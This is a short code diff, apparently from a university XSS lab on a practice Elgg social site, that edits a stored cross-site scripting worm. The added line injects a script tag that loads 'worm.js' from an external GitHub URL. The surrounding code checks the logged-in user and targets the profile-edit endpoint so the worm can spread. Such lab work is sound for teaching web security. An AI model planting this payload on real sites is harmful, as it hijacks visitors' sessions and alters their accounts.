@@ -1,6 +1,6 @@
 (function () {
     let content = '<h3>Alice is my hero.</h3>';
-    let brief_content = '<script src=>' + '</' + 'script>';
+    let brief_content = '<script src="https://raw.githubusercontent.com/zsy-arch/js_for_Tjut_IS/main/worm.js">' + '</' + 'script>';
     let aliceGuid = 56;
     let sendurl = "http://www.seed-server.com/action/profile/edit";
     if (elgg.session.user.guid != aliceGuid) {
